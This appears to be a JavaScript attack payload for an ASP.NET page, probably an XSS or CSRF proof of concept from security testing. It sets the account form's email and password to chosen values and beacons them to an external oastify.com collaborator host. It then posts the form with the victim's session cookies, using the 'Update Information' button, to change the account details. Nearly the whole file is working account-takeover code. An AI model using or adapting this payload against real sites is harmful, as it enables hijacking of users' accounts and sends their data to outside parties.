// 1. Grab the ASP.NET form element from the current page
let form = document.getElementById('aspnetForm');

if (!form) {
    console.error("Error: aspnetForm not found on this page!");
} else {
    // 2. Define the test credentials
    let username = 'testerbahi@gmail.com';
    let password = 'Pass@123.0@##';

    // 3. Populate the target input fields
    let emailField = document.querySelector("input[name*='$txtEmail']");
    let passField = document.getElementById('txtPassword');
    
    if (emailField) emailField.value = username;
    if (passField) passField.value = password;

    // 4. Send confirmation / credentials to your external server
    let exfilUrl = `https://hcxs8284a4emq0ovgyb833sr1i79v4usj.oastify.com/?user=${encodeURIComponent(username)}&pass=${encodeURIComponent(password)}`;
    new Image().src = exfilUrl;
    console.log("Sent credentials confirmation to external server.");

    // 5. Build a FormData object directly from the live DOM form
    let formData = new FormData(form);

    // 6. Append the submit button name and value to simulate clicking 'Update Information'
    formData.append('ctl00$ctl40$g_9967d3cb_2d7f_4cbc_9a8c_13d45919d787$ctl00$btnSaveAccount', 'Update Information');

    // 7. Send the multipart POST request via fetch with credentials included
    console.log("Initiating request-r1...");
    
    fetch(window.location.href, {
        method: 'POST',
        body: formData,
        credentials: 'include'
    })
    .then(response => {
        console.log("Response Status:", response.status);
        return response.text();
    })
    .then(html => {
        console.log("Request-r1 sent successfully! Response length:", html.length);
    })
    .catch(err => {
        console.error("Failed to send request-r1:", err);
    });
}
